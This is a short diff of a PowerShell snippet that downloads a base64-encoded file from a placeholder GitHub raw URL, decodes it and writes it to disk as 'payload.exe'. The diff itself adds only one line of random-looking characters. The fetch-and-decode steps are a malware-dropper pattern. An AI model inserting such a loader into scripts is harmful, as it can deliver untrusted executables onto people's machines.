@@ -1,3 +1,5 @@
 $encoded = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/you/repo/main/payload.b64.txt"
 
 [IO.File]::WriteAllBytes("payload.exe", [Convert]::FromBase64String($encoded))
+
+N3QelHSu4pef
